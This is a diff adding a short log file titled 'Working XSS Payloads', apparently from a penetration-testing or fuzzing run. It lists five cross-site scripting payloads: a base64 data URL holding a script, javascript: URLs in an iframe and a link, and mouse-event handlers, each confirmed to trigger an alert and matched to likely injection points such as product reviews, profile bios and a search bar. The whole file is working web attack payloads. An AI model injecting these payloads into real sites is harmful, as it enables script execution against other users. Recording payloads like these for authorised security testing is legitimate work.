@@ -1,0 +1,7 @@
+# Working XSS Payloads - 2025-06-25 19:39:45.787827
+# Payload | Expected Behavior | Actual Behavior | Context | Test Context
+<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==> | Alert expected | Alert triggered | Moderate likelihood in product reviews or profile bio (data URL) | Unknown
+<iframe src=javascript:alert(decodeURIComponent('%58%53%53'))> | Alert expected | Alert triggered | High likelihood in product reviews or profile bio (javascript URL) | Unknown
+<img src=x onmousemove=alert`1`> | Alert expected | Alert triggered | High likelihood in search bar or product reviews (e.g., mousemove, onerror, focus) | Unknown
+<a href=javascript:alert('click')> | Alert expected | Alert triggered | High likelihood in product reviews or profile bio (javascript URL) | Unknown
+<div onmouseover=alert('xss')> | Alert expected | Alert triggered | Moderate likelihood in product reviews (e.g., mouseover, click, pointerdown) | Unknown
